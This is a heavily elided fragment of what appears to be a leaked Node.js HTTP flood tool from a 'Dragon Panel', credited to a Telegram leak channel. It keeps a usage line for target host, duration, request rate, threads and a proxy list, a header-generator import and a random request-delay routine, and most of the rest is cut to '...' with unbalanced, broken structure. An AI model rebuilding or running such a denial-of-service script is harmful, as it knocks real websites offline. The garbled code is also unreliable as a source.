//exposed to leak from t.me/LeakingCode
// Method Dragon Panel [ HTTPSV1 ]
...
const fs = require("fs");
const header = require("header-generator");
...
const secureOptions = 
 ...
 if (process.argv.length < 7){console.log(`Usage: host time req thread proxy.txt TLS/HTTP`); process.exit();}
...
function cookieString(cookie) {
 ...
 function randomElement(elements) {
  ...
  else if (args.input === 'HTTP') {
	  function randomDelay(min, max) {
		return Math.floor(Math.random() * (max - min + 1)) + min;
	  }
  
	  
	  interval = randomDelay(100, 700);
	} else {
	  interval = 1000;
	}
